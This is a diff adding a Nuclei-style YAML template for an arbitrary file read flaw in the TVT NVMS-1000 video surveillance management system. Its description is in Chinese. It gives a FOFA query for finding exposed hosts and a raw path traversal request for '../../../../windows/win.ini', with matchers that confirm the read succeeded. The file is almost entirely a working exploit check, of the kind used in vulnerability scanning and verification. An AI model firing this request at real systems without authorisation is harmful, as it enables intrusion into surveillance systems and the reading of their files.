@@ -1,0 +1,30 @@
+id: nvms-1000-video-system-lfi
+
+info:
+  name: "TVT-NVMS-1000 网络监控视频管理系统 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="TVT-NVMS-1000"
+          TVT数码科技 TVT NVMS-1000 是中国 TVT 数码科技公司开发的网络监控视频管理系统。该系统存在路径遍历安全缺陷，攻击者可通过构造包含路径遍历序列的请求，读取目标系统上的任意文件。
+  tags: TVT-NVMS-1000
+
+http:
+- raw:
+  - |
+    GET ../../../../windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    X-Requested-With: XMLHttpRequest
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: dataPort=6063
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
